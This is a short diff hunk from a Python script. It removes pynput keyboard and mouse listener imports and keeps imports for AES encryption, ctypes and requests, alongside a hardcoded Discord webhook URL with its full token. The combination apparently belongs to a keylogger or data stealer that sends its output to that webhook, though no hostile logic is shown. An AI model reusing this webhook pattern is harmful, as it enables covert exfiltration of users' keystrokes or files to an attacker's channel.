@@ -14,9 +14,6 @@ from Crypto.Cipher import AES
 import requests
 import ctypes
 import time
-from pynput import mouse, keyboard
-from pynput.keyboard import Listener as KeyboardListener
-from pynput.mouse import Listener as MouseListener
 
 WEBHOOK_URL = https://discord.com/api/webhooks/1439340174340390913/ma4jamCgF3dVLl8RG5pQjvN1DB7Ns45bfPk87-MEJwHwoRnmToA46trbe9ep-yCWBE-m
 
